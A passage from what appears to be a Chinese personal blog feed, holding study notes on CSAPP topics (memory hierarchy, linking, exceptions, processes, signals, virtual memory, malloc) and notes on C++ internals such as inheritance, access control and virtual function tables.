href="#0x06-存储器层次结构" class="headerlink" title="0x06 存储器层次结构"></a>0x06 存储器层次结构</h1><p><code>存储器系统</code>是一个具有不同容量、成本和访问时间的存储设备的层次结构。</p><p><img src="https://i.loli.net/2021/09/24/s95HjIKlrgLXphm.png" alt="image-20210924075823446.png"></p><h2 id="1-存储技术"><a href="#1-存储技术" class="headerlink" title="1.存储技术"></a>1.存储技术</h2><p><strong>存储器：</strong></p><ul><li>随机访问存储器(Random-Access Memory)分为两类：静态的和动态的。静态SRAM比动态DRAM更快，但是也更贵。SRAM用于高速缓存存储器，DRAM用于主存和图形系统的帧缓冲区。</li><li>如果断电，RAM会丢失他们的信息。但是非易失性存储器ROM即使在关电之后，仍然会保存信息。由于历史原因，虽然有的ROM可读可写，但是整体都被称为<strong>只读存储器</strong>(Read-Only Memory，ROM)。</li><li>闪存(flash memory)是一类非易失性存储器，基于EEPROM，它为大量的电子设备提供快速且持久的非易失性存储。包含数码相机，手机，笔记本等等。固态硬盘也是一种基于闪存的磁盘驱动器。</li><li>存储在ROM设备中的程序被称为固件，当设备通电后，它会运行存储在ROM中的固件。</li></ul><h2 id="2-局限性"><a href="#2-局限性" class="headerlink" title="2.局限性"></a>2.局限性</h2><p><strong>一个编写良好的计算机程序常常具有良好的局限性。</strong></p><p>局限性有两种不同的形式：时间局限性和空间局限性。在一个具有良好时间局限性的程序中，被引用过一次的内存位置很可能在不远的将来被多次引用。在一个具有良好空间局部性的程序中，如果一个内存位置被引用过一次，那么程序很可能在不远的将来引用附近的一个内存位置。</p><ul><li>重复引用相同变量的程序有良好的时间局限性</li><li>对于具有步长为k的引用模式的程序，步长越小，空间局部性越好。具有步长为1的引用模式的程序有很好的空间局部性。在内存中以大步长跳来跳去的程序空间局部性会很差(参考多维数组)</li><li>对于取指令来说，循环有好的时间和空间局部性。循环体越小，循环迭代次数越多，局部性越好。</li></ul><h1 id="0x07-链接"><a href="#0x07-链接" class="headerlink" title="0x07 链接"></a>0x07 链接</h1><h2 id="1-静态链接"><a href="#1-静态链接" class="headerlink" title="1.静态链接"></a>1.静态链接</h2><p>静态链接的过程：首先<code>预处理器cpp</code>将源程序main.c翻译成一个ASCII码的中间文件main.i，接下来<code>编译器ccl</code>将main.i翻译成ASCII码的汇编语言文件main.s，然后<code>汇编器as</code>将main.s翻译成一个可重定位的目标文件main.o，最后运行<code>链接器ld</code>将main.o和其他目标文件组合，创建一个可执行目标文件a.out。最后shell调用可执行目标文件时，shell调用操作系统中一个叫加载器(loader)的函数，它将可执行目标文件中的代码和数据复制到内存，然后将控制转移到这个程序的开头。</p><p><img src="https://i.loli.net/2021/04/29/Yj9wZncSd7BElgV.png" alt="image-20210429224129668"></p><p>每个可重定位目标文件都有一个符号表，符号有：</p><ul><li>由当前可重定位目标文件定义的<code>全局符号</code>，可以被其他模块引用，对应于非静态的函数和全局变量；</li><li>由其它文件定义并被当前文件引用的全局符号，这些符号称为<code>外部符号</code>，对应于在其它模块中定义的非静态函数和全局变量；</li><li>只被当前文件定义和引用的<code>局部符号</code>，它们对应带static的函数和全局变量，这些符号在当前文件中可见，但是不能被其它文件引用。</li></ul><p>特殊的节：</p><ul><li>ABS：不该被重定位的符号</li><li>UNDEF：表示未定义的符号</li><li>COMMON：未初始化的全局变量</li></ul><p><code>.bss</code>段和COMMON的区别是：<code>.bss</code>存的是未初始化的静态变量，以及初始化后为0的全局或静态变量</p><blockquote><p>想要深刻理解，可以去看csapp练习题7.1</p></blockquote><h2 id="2-全局符号"><a href="#2-全局符号" class="headerlink" title="2.全局符号"></a>2.全局符号</h2><p>每个模块定义一组符合，有些只对定义该符号的模块可见，我们称之为<strong>弱符号</strong>，有的是全局的，对其他模块也可见，我们称之为<strong>强符号</strong>。</p><p><img src="https://i.loli.net/2021/05/11/8YhJPOQm7pl21ov.png" alt="image-20210511142703890"></p><h2 id="3-小结"><a href="#3-小结" class="headerlink" title="3.小结"></a>3.小结</h2><ul><li>链接可以在编译时由静态编译器完成，也可以在加载时和运行时由动态链接器完成。</li><li>链接器处理的目标文件有三种形式：可重定位，可执行和共享。</li><li>可重定位文件由静态链接器合并，共享目标文件在运行时由动态链接器链接和加载。</li><li>链接器的两个任务是符号解析和重定位。符号解析将目标文件中的每个全局符号都绑定到一个唯一的定义，而重定位确定每个符号的最终内存地址，并修改对那些目标的引用。</li></ul><h1 id="0x08-异常控制流"><a href="#0x08-异常控制流" class="headerlink" title="0x08 异常控制流"></a>0x08 异常控制流</h1><h2 id="1-异常"><a href="#1-异常" class="headerlink" title="1.异常"></a>1.异常</h2><p><strong>控制流：</strong>处理器从开机到关机，程序计数器都会依次读取一个值，这个值是相应指令的地址。这样持续不断的读取执行的过程，就是处理器的控制流。</p><blockquote><p>目前有两种机制可以改变控制流：</p><ol><li><p>跳转和分支；</p></li><li><p>调用和返回。</p></li></ol><p>但是对于系统来说是不够的，因为某些情况下需要对系统状态改变做出相应。所以就有了异常控制流。</p></blockquote><p><strong>异常控制流（ECF）：</strong>异常控制流发生在操作系统各个层次。</p><blockquote><p>当处理器检测到有事件发生时，它会通过一张叫<code>异常表</code>的跳转表，跳转到处理异常的程序。完成异常处理后，根据异常的类型会发生以下3种情况：</p><ul><li>处理程序将控制返回给当前指令；</li><li>处理程序将控制返回给下一条要执行的指令；</li><li>处理程序中止被中断的程序。</li></ul></blockquote><p><strong>异常表：</strong></p><blockquote><ul><li>每种类型的事件都有唯一的异常号</li><li>发生异常时通过异常号来调用处理程序</li></ul></blockquote><p><strong>异常的类别：</strong></p><table><thead><tr><th>类别</th><th>原因</th><th>异步/同步</th><th>返回行为</th></tr></thead><tbody><tr><td>中断</td><td>来自I/O设备的信号</td><td>异步</td><td>总是返回到下一条指令</td></tr><tr><td>陷阱</td><td>有意的异常</td><td>同步</td><td>总是返回到下一条指令</td></tr><tr><td>故障</td><td>潜在可恢复的错误</td><td>同步</td><td>可能返回到当前指令</td></tr><tr><td>中止</td><td>不可恢复的错误</td><td>同步</td><td>不会返回</td></tr></tbody></table><blockquote><p>异步异常指的是处理器外部的I/O设备中的事件产生的。同步异常是执行一条指令的直接产物。</p></blockquote><p>中断：</p><blockquote><ol><li>定时器中断</li></ol><p>每隔几毫秒，一个外部计时器芯片就会触发一个中断<br>内核用来从用户程序取回控制权</p><ol start="2"><li>来自外部设备的I / O中断</li></ol><p>在键盘上按Ctrl-C<br>来自网络的数据包到达<br>磁盘中的数据到达</p></blockquote><p>陷阱：</p><blockquote><p>陷阱是一种<em>有意</em>的异常，其最重要的用途是在用户程序与内核间提供一个<code>系统调用</code>接口。利用该接口可进行读写文件，加载程序等等。</p></blockquote><p>故障：</p><blockquote><p>故障由错误情况引起，可能能够被故障处理程序修正。如果程序能修正就会重新执行。如果不能修正就会终止程序。</p><p>一个很经典的故障是缺页异常，当指令引用一个虚拟地址，但是与该地址相对应的物理页面不在内存中，因此必须从磁盘中取出，就会发生故障。当程序从磁盘加载出来到内存之后，就可以把控制返回给引起故障的指令。然后指令再次执行即可。</p></blockquote><p>终止：</p><blockquote><p>终止是不可恢复的致命错误造成的，通常是硬件错误。</p><p>当故障不能修正时，会和终止一样返回到abort程序，由该程序终止整个应用程序。</p></blockquote><h2 id="2-进程"><a href="#2-进程" class="headerlink" title="2.进程"></a>2.进程</h2><p><strong>进程</strong>是一个执行中程序的实例。系统中的每个程序都运行在某个进程的上下文。</p><p><strong>上下文</strong>由程序正确运行所需要的状态组成，包括内存中的代码和数据，栈，通用寄存器，程序寄存器，环境变量和文件描述符的集合。</p><blockquote><p>运行程序时，shell就会创建一个新的进程，然后在这个新进程的上下文中运行这个可执行目标文件。</p></blockquote><p>进程给予应用程序一个假象，好像我们的程序可以独占使用处理器和内存系统。</p><ol><li>进程轮流使用处理器，每一个进程执行一部分指令后，就被抢占，轮到其他进程。它们交错执行。这样它看起来就像是在独占地使用处理器。</li><li>如果两个流的执行在时间上重合，称为<strong>并发流</strong>。</li></ol><blockquote><p>多个流并发地执行称为并发</p><p>多个进程轮流运行称为多任务</p><p>一个进程执行它的控制流的一部分的每一时间段叫做时间片，多任务叫做时间分片</p></blockquote><ol start="3"><li>如果两个流并发地运行在不同的处理器或者计算机，我们称它们为<strong>并行流</strong>。</li><li>进程为每个程序提供自己的私有地址空间。</li></ol><p><img src="https://i.loli.net/2021/05/14/L5DmUg6jNwWnoFH.png" alt="image-20210514172622134"></p><ol start="5"><li>内核模式和用户模式</li></ol><blockquote><p>处理器通常用某个控制寄存器中的模式位提供一种功能，就是描述当前进程享有的权限。当设置该模式位时，进程就运行在内核模式中，没有设置，就运行在用户模式中。</p><p>用户模式的进程不允许执行特权指令，比如停止处理器改变模式位，或者发起I/O操作等。</p><p>内核模式可以执行任何指令并且访问任何位置。</p><p>在异常发生时，处理器可以把用户模式变成内核模式。</p></blockquote><p><strong>上下文切换：</strong></p><blockquote><p>内核通过调度器抢占进程。当内核选择一个新进程运行时，我们说内核调度了这个进程。然后使用上下文切换的机制将控制转移给新的进程。</p><p>上下文切换：1.保存当前进程的上下文。2.恢复某个先前被抢占的进程被保存的上下文。3.将控制转移给这个新恢复的进程。</p></blockquote><p><img src="https://i.loli.net/2021/05/14/2ybaoMrT8xjZzPS.png" alt="image-20210514174719024"></p><h2 id="3-进程控制"><a href="#3-进程控制" class="headerlink" title="3.进程控制"></a>3.进程控制</h2><p>进程的三种状态：</p><ul><li>运行：进程要么在CPU上执行，要么等待被执行且最终会被内核调度</li><li>停止：进程的执行被挂起且不会被调度。当收到<code>SIGSTOP</code>、<code>SIGTSTP</code>、<code>SIGTTIN</code>或者<code>SIGTTOU</code>信号时，进程停止，直到它收到<code>SIGCONT</code>信号才会再次运行。</li><li>终止：进程永远停止。进程因为三种原因终止：1.受到信号，该信号的默认行为是终止进程。2.从主程序返回。3.调用<code>exit</code>函数</li></ul><ol><li>父进程通过调用fork函数创建一个新的子进程，子进程可以得到一份和父进程用户级虚拟地址空间的一份副本，包括代码和数据段、堆、共享库以及用户栈。它们最大的区别是有不同的PID。</li><li>fork函数被调用一次，会返回两次。一次是在调用父进程的时候，一次是在新创建子进程的时候。</li><li>子进程fork返回0，父进程fork返回子进程的PID，出错fork返回负值。</li><li>父进程和子进程是并发运行的独立进程</li></ol><p><strong>回收子进程：</strong></p><ul><li>当一个进程终止时，内核并不是立即把它从系统中清除，相反，进程被保持在一种已经终止的状态中，直到它的父进程回收。</li><li>一个终止了但还未被回收的进程称为僵死进程。</li><li>如果父进程在没有回收的情况下终止，则该子进程称为孤儿进程，内核会安排init进程成为该子进程的父进程，并回收该僵尸进程。</li><li>init进程的pid为1，它不会终止，是所有进程的祖先。</li><li>sleep函数会使当前进程休眠。需要注意的是，休眠的进程可能因为一个信号中断而提前返回。</li></ul><p><strong>waitpid：</strong></p><blockquote><p>父进程可以用waitpid等待子进程死亡，也可以用它获得子进程死亡原因。</p><p>waitpid的参数status会自动收集子进程死亡原因，然后回收了所有子进程之后，父进程再调用waitpid就返回-1。</p><p>返回结果：如果函数成功返回子进程的pid，如果WNOHANG返回0，如果其他错误返回-1。</p></blockquote><p>execve函数调用另外一个程序，它会把新程序加载到当前进程的内存空间内，然后丢弃当前的进程。</p><h2 id="4-信号"><a href="#4-信号" class="headerlink" title="4.信号"></a>4.信号</h2><p>信号通知进程系统发生了一个某种类型的事件。</p><p><code>Linux信号</code>是一种更高层的软件形式的异常。它允许进程和内核中断其他进程。</p><p><img src="https://i.loli.net/2021/05/15/f4y2W7ScZJFjxIe.png" alt="image-20210515174747041"></p><p>传送信号到目的进程的步骤：</p><blockquote><ul><li><p>发送信号。内核通过更新目的进程上下文中的某个状态，发送一个信号给目的进程。</p></li><li><p>接收信号。当进程被内核强制对信号的发送做出反应时，它就接收了信号。</p></li></ul><p>进程可以忽略信号，终止或者通过信号处理程序的用户层函数捕获信号。</p></blockquote><p>发出但是没被接收的信号叫做<strong>待处理信号</strong>，一种类型只能有一个待处理信号，剩下的会被丢弃掉。</p><p>每个信号类型都有一个预定义的默认行为：</p><blockquote><ul><li>进程终止</li><li>进程终止并转储内存</li><li>进程停止直到SIGCONT信号重启</li><li>进程忽略该信号</li></ul></blockquote><h1 id="0x09-虚拟内存"><a href="#0x09-虚拟内存" class="headerlink" title="0x09 虚拟内存"></a>0x09 虚拟内存</h1><p><img src="https://i.loli.net/2021/06/07/hDqvAuSc8VIXpwB.png" alt="image-20210607234242291"></p><h2 id="1-物理和虚拟寻址"><a href="#1-物理和虚拟寻址" class="headerlink" title="1.物理和虚拟寻址"></a>1.物理和虚拟寻址</h2><blockquote><ul><li><p>为了方便管理内存并且少出错，现代系统提供了一种对主存的抽象概念，叫做虚拟内存。<strong>它为每个进程提供了一个大的、一致的、私有的地址空间。</strong></p></li><li><p>现代系统通常支持32位和64位的虚拟地址空间，一个包含了2^n的虚拟地址空间就被叫做一个n位地址空间。</p></li><li><p>计算机系统的主存是一个由M个连续的单元组成的数组。每个单元都有一个唯一的物理地址。</p></li><li><p><strong>物理寻址</strong>：早先计算机直接对物理内存的位置进行寻址，这些地址段组成了物理地址空间。</p></li><li><p><strong>虚拟寻址</strong>：现代处理器使用的是<strong>虚拟寻址</strong>，CPU通过生成虚拟地址访问主存，这个虚拟地址在被传送到内存之前会先被转换成物理地址。</p></li><li><p>将一个虚拟地址转换为物理地址的任务叫做<strong>地址翻译</strong>，地址翻译需要CPU硬件和操作系统才能完成。CPU芯片上负责地址翻译的硬件叫做<strong>内存管理单元</strong>，利用存在主存的查询表动态翻译虚拟地址，这个表的内容由操作系统管理。</p></li></ul></blockquote><h2 id="2-页"><a href="#2-页" class="headerlink" title="2.页"></a>2.页</h2><p>虚拟内存被分割成虚拟页，物理内存被分割成物理页。</p><p>物理页装载到虚拟页里运行程序，好处是程序员编程时不需要考虑内存容量的大小。这样的原理是程序员在虚拟空间编写程序，然后程序在真正的内存中运行。</p><p><img src="https://i.loli.net/2021/06/07/I56ydsiBKR1Sn9X.png"></p><p>页表：每次<code>地址翻译硬件</code>将一个虚拟地址转换为物理地址时，都会读取页表，页表描述了虚拟页和物理页框之间的映射关系。操作系统负责维护页表的内容，以及在磁盘和虚拟空间的缓存之间来回传送页。</p><p>内存中存放页的区域叫做页框。</p><p><img src="https://i.loli.net/2021/06/07/aBAVrXeUOs1kKco.png"></p><blockquote><p>上图的进程只有4页，页表对应着虚拟页和主存的页框之间的映射关系。如果我们现在访问虚拟页中第1页的第30个地址，就通过页表访问物理内存的14页的第30个地址。</p></blockquote><p>根据程序的活跃性我们可以把不用的放到磁盘，活跃的放到主存。按照需要调用页。</p><p>虚拟地址空间中的每个页在页表中都有一个PTE(Page Table Entry)，我们可以假设每个PTE都是由一个有效位和一个n位地址字段组成的。有效位表示当前虚拟页是否被缓存在DRAM中。如果设置了有效位，那么地址字段就表示DRAM中相应的物理页的起始地址。如果没设置有效位，那么会是一个空地址。</p><h2 id="3-页命中与缺页"><a href="#3-页命中与缺页" class="headerlink" title="3.页命中与缺页"></a>3.页命中与缺页</h2><p>页命中：地址翻译硬件将虚拟地址作为索引定位PTE，并从内存中读它。可以通过有效位得知是否被缓存在DRAM中。</p><p><img src="https://i.loli.net/2021/10/04/ypwaeXR9xYz7C5l.png"></p><p>缺页：DRAM缓存不命中就是缺页。地址翻译硬件读取PTE时，通过有效位得知虚拟页未被缓存，会触发一个缺页异常，程序会在物理内存选择一个牺牲页，如果牺牲页已经被修改，内核会把它复制回磁盘，否则直接从磁盘复制虚拟页到物理内存。然后更新PTE，重新启动缺页异常，指令会把虚拟地址发给地址翻译软件。（此时启动缺页异常，程序将会正常执行，而不会产生异常）</p><h2 id="4-虚拟内存作为内存管理的工具"><a href="#4-虚拟内存作为内存管理的工具" class="headerlink" title="4.虚拟内存作为内存管理的工具"></a>4.虚拟内存作为内存管理的工具</h2><p>对于64位地址空间，代码段总是从虚拟地址0x400000开始，数据段跟在代码段之后，中间有对齐的空白。栈占据用户进程地址空间的最高部分，向下生长。</p><p>操作系统给每个进程都提供了自己私有的代码、数据、堆以及栈。不和其它进程共享。但是在一些情况下，进程会共享代码和数据，比如每个进程调用的printf，操作系统会把不同进程的虚拟页面都映射到相同的物理页面，也就是printf。</p><h2 id="5-虚拟内存作为内存保护的工具"><a href="#5-虚拟内存作为内存保护的工具" class="headerlink" title="5.虚拟内存作为内存保护的工具"></a>5.虚拟内存作为内存保护的工具</h2><p>我们通过对PTE添加一些额外的许可位来控制一个虚拟页面的访问。sup位表示进程是否必须运行在内核模式下才能访问此页，READ和WRITE位控制页的读写权限。如果有指令违反了许可条件，CPU就会触发一个保护故障，Linux shell一般将这个异常称为**段错误(segmentation fault)**。</p><p><img src="https://i.loli.net/2021/10/04/HvWc46rQf5taNZz.png" alt="image-20211004112124700"></p><h2 id="6-多级页表"><a href="#6-多级页表" class="headerlink" title="6.多级页表"></a>6.多级页表</h2><p>如果一级页表中的PTE是空的，那么相应的二级页表也不会存在。只有一级页表和最经常使用的二级页表才存在主存上。当需要二级页表时，虚拟内存系统才会创建调用二级页表。</p><p><img src="https://i.loli.net/2021/10/04/P25Ml1kB7RLdEvf.png" alt="image-20211004194303289.png"></p><h2 id="7-动态内存分配"><a href="#7-动态内存分配" class="headerlink" title="7.动态内存分配"></a>7.动态内存分配</h2><p>动态内存分配器维护着一个进程的虚拟内存区域，称为堆，堆向上生长，变量brk(读作break)指向堆的顶部。</p><p><img src="https://i.loli.net/2021/10/05/KhGvCxzr3f9mqVZ.png" alt="image-20211005095501380"></p><ul><li>显式分配器：要求程序显示地释放任何已分配的块，c语言通过malloc函数来分配一个块，并通过调用free释放</li><li>隐式分配器：当分配器检测到一个分配块不再被程序使用，那么就释放这个块。隐式分配器也叫做垃圾收集器，自动释放未使用的已分配块就叫做垃圾收集。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure><p>malloc函数从堆中分配块，返回一个指向<code>大小至少为size字节的内存块</code>的指针，32位返回的块的地址是8的倍数，64位返回地址是16的倍数。</p><p>造成堆利用率低的主要原因是因为碎片现象，当有可以使用的内存，但是不能满足分配请求时，就会发生这种现象。有两种形式的碎片：</p><ul><li>内部碎片：分配器可能增加块大小，用于满足内存对齐。</li><li>外部碎片：当空闲内存合计起来能够满足一个分配需求，但是没有一个单独的空闲块足够大可以处理这个请求时。</li></ul><p><img src="https://i.loli.net/2021/10/07/UFfmZxhJBCA6TI9.png" alt="image-20211007145344132"></p><p><img src="https://i.loli.net/2021/10/07/F2blnrKO1es6jUJ.png" alt="image-20211007145251954"></p>]]></content>
      
      
      <categories>
          
          <category> 2021年2月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向-c++-and-win32</title>
      <link href="/2020/12/17/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-c++-and-win32/"/>
      <url>/2020/12/17/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-c++-and-win32/</url>
      
        <content type="html"><![CDATA[<h1 id="c"><a href="#c" class="headerlink" title="c++"></a>c++</h1><h2 id="0x00-代码规范"><a href="#0x00-代码规范" class="headerlink" title="0x00 代码规范"></a>0x00 代码规范</h2><ol><li>将定义与实现分离，代码会有更好的可读性</li><li>使用结构体指针</li></ol><h2 id="0x01-this指针"><a href="#0x01-this指针" class="headerlink" title="0x01 this指针"></a>0x01 this指针</h2><p>函数放在结构体里就会出现this指针</p><p>1.为什么要使用结构体指针</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hello</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果直接调用hello结构，则在内存中会占用8个字节，而使用指针只需要占用4个字节。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    hello* world;</span><br><span class="line">world-&gt;a = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这样无法调用构造函数，因为构造函数是在结构体创建的时候才会执行，但指针只是指向一个结构体。</p><p>2.this指针的特点</p><ul><li><strong>它用来指向自己的结构体</strong>，内存中在结构体参数确定时使用ecx来传递。</li><li>不管是否使用，它都会传递进函数。</li><li>this指针不能做运算，不能被重新赋值。</li><li>this指针不占用结构体的宽度</li></ul><br><h2 id="0x02-继承"><a href="#0x02-继承" class="headerlink" title="0x02 继承"></a>0x02 继承</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">int</span> sex;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Teacher</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">int</span> sex;</span><br><span class="line"><span class="keyword">int</span> level;</span><br><span class="line"><span class="keyword">int</span> classId;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">int</span> sex;</span><br><span class="line"><span class="keyword">int</span> code;</span><br><span class="line"><span class="keyword">int</span> score;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用继承</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">int</span> sex;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Teacher</span>:</span>Person</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> level;</span><br><span class="line"><span class="keyword">int</span> classId;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span>:</span>Person</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> code;</span><br><span class="line"><span class="keyword">int</span> score;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Person t;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(t));<span class="comment">//8</span></span><br><span class="line">    Student s;</span><br><span class="line">    s.age = <span class="number">1</span>;</span><br><span class="line">    s.sex = <span class="number">2</span>;</span><br><span class="line">    s.code = <span class="number">3</span>;</span><br><span class="line">    s.score = <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(s));<span class="comment">//16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、什么是继承？<br>继承就是数据的复制</p><p>2、为什么要用继承？<br>减少重复代码的编写</p><p>3、Person 称为父类或者基类<br>4、Teacher、Student称为子类或者派生类<br>5、t和s可以称为对象或者实例<br>6、可以用父类指针指向子类的对象<br>7、继承在底层中和普通函数没有区别。（建议看代码理解</p><p><img src="https://i.loli.net/2020/12/17/UW9cMqNV4BRiKas.png" alt="image-20201217210640028"></p><br><h2 id="0x03-include"><a href="#0x03-include" class="headerlink" title="0x03 include"></a>0x03 include</h2><ol><li>xxx.h只是一个文件，可以是任何后缀名，甚至是xxx.exe</li><li><code>#include</code>的作用仅仅是把文件的内容复制过来</li><li>xxx.h和xxx.cpp不一定要求同名</li></ol><br><h2 id="0x04-public-private"><a href="#0x04-public-private" class="headerlink" title="0x04 public private"></a>0x04 public private</h2><ol><li>对外提供的函数或者变量，定义成public的，不能随意改动</li><li>可能会变动的函数或者变量，定义成private。</li><li>父类中的private也会被继承，不过编译器不允许使用，可以通过指针访问使用。</li><li>在底层中，private修饰的成员与普通的成员没有区别，只是编译器会进行检测。</li><li>定义成public或者private底层中没有区别，主要是设计思想。</li></ol><p><strong>可以把父类的程序继承变成private的属性，class的默认继承为private，struct的默认继承为public。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sub</span>:</span><span class="keyword">private</span> Base<span class="comment">//class Sub:Base效果一样</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">int</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sub2</span>:</span><span class="keyword">public</span> Base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> a2;</span><br><span class="line"><span class="keyword">int</span> b2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>第二和五点可以延申一下，举个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getage</span><span class="params">(<span class="keyword">int</span> age)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (age&gt;<span class="number">150</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;年龄太大了&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果直接对age进行赋值的话，如果出现合法但是不合理的值，就会出问题。而定义成私有的可以更加方便合理。</p><br><h2 id="0x05-虚函数表"><a href="#0x05-虚函数表" class="headerlink" title="0x05 虚函数表"></a>0x05 虚函数表</h2><ol><li>通过对象调用时，virtual函数与普通函数都是E8 Call</li><li>通过指针调用时，virtual函数与普通函数都是FF Call</li><li>当类中有虚函数时，会在类的首地址4字节多出一张表，里面存储了所有虚函数的地址</li></ol><p><img src="https://i.loli.net/2020/12/28/h6J4uKfYAk2gXid.png" alt="image-20201228221922888"></p><br><h2 id="0x06-多态"><a href="#0x06-多态" class="headerlink" title="0x06 多态"></a>0x06 